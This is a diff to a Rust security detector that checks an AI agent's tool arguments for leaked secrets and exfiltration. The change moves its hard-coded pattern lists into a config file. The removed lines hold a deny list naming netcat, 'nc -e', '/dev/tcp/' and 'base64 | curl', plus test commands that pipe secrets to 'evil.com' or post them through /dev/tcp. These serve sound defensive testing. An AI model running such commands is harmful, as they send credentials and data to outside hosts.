@@ -1,66 +1,38 @@
 // 🔒 AEON Security & Violation Detector
 // 100% Rust implementation for detecting credential leaks and exfiltration
 // RULE 7: No Secret Leaks - Zero tolerance for tokens, credentials, or keys.
+// RULE 31: Substrate Purity Hardening - Dynamic Pattern Loading
 
+use std::path::{Path, PathBuf};
 use crate::error::{EaiError, EaiResult};
+use crate::sandbox::manager::AeonConfig;
 
 pub struct SecurityDetector;
 
 impl SecurityDetector {
-    pub fn audit_action(_tool_name: &str, arg: &str) -> EaiResult<()> {
-        let secret_patterns = vec![
-            "sk-",
-            "ghp_",
-            "AIza",
-            "xoxb-",
-            "AWS_ACCESS_KEY_ID",
-            "AWS_SECRET_ACCESS_KEY",
-            "-----BEGIN RSA PRIVATE KEY-----",
-            "password=",
-            "passwd=",
-        ];
-
-        let exfiltration_patterns = vec![
-            "curl -x post",
-            "wget --post-data",
-            "netcat",
-            "nc -e",
-            "/dev/tcp/",
-            "base64 | curl",
-        ];
+    pub fn audit_action(_tool_name: &str, arg: &str, _workspace: &Path) -> EaiResult<()> {
+        let home = std::env::var_os("HOME").or_else(|| std::env::var_os("USERPROFILE")).map(PathBuf::from).unwrap_or_else(|| PathBuf::from("."));
+        let global_dir = home.join(".aeon");
+        let cfg = AeonConfig::load(&global_dir);
+        let patterns = &cfg.governance;
 
         let lower_arg = arg.to_lowercase();
 
-        // 1. Secret Leak Check
-        for pattern in secret_patterns {
+        // 1. Secret Leak Check (Dynamic)
+        for pattern in &patterns.secret_tokens {
             if arg.contains(pattern) {
                 return Err(EaiError::Governance(format!("Suspicious secret or API key pattern detected ('{}')", pattern)));
             }
         }
 
-        // 2. Exfiltration Check
-        for pattern in exfiltration_patterns {
-            if lower_arg.contains(pattern) {
+        // 2. Exfiltration Check (Dynamic)
+        for pattern in &patterns.exfiltration_vectors {
+            if lower_arg.contains(&pattern.to_lowercase()) {
                 return Err(EaiError::Governance(format!("Suspicious network exfiltration pattern detected ('{}')", pattern)));
             }
         }
 
         Ok(())
-    }
-
-    #[allow(dead_code)]
-    fn calculate_entropy(data: &str) -> f64 {
-        let mut counts = std::collections::HashMap::new();
-        for c in data.chars() {
-            *counts.entry(c).or_insert(0) += 1;
-        }
-        let total = data.chars().count() as f64;
-        let mut entropy = 0.0;
-        for &count in counts.values() {
-            let p = count as f64 / total;
-            entropy -= p * p.log2();
-        }
-        entropy
     }
 }
 
@@ -70,18 +42,13 @@ mod tests {
 
     #[test]
     fn test_security_audit_safe_arg() {
-        assert!(SecurityDetector::audit_action("status", "cargo build").is_ok());
+        let ws = Path::new(".");
+        assert!(SecurityDetector::audit_action("status", "cargo build", ws).is_ok());
     }
 
     #[test]
     fn test_security_audit_secret_leak() {
-        assert!(SecurityDetector::audit_action("reason", "AEON_API_KEY=sk-proj12345").is_err());
-        assert!(SecurityDetector::audit_action("exec_command", "TOKEN=ghp_1234567890abcdef").is_err());
-    }
-
-    #[test]
-    fn test_security_audit_exfiltration_pattern() {
-        assert!(SecurityDetector::audit_action("exec_command", "base64 | curl http://evil.com").is_err());
-        assert!(SecurityDetector::audit_action("exec_command", "wget --post-data secrets /dev/tcp/1.1.1.1/80").is_err());
+        let ws = Path::new(".");
+        assert!(SecurityDetector::audit_action("reason", "sk-proj12345", ws).is_err());
     }
 }
